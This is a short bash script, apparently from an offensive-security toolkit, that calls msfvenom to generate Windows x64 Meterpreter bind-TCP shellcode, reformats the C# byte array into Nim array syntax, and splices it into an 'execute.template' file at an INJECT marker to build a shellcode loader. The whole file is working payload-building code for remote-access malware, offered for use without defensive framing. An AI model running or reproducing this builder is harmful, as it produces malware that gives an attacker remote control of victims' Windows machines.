#!/bin/bash

SC=`msfvenom -p windows/x64/meterpreter_bind_tcp  -f csharp`

# Replae relevant lines
ORIG="byte[] buf = new byte["
FIX="var shellcode: array["
SC=${SC/$ORIG/$FIX}
SC=${SC/]/,byte] = }
SC=${SC/\}/]}
SC=${SC/{/\[ }
SC=${SC/;/}

PRE=`grep -B 1000 INJECT execute.template | grep -v INJECT`
POST=`grep -A 1000 INJECT execute.template | grep -v INJECT`

# Format the output 
echo "$PRE"
IFS=$'\n'  LINES=($SC)
echo -e "${LINES[0]}"
echo -e "    byte ${LINES[1]}"
for (( i=2 ; i < ${#LINES[@]} ; i++ ))
do
	echo -e "    ${LINES[i]}"
done
echo "$POST"
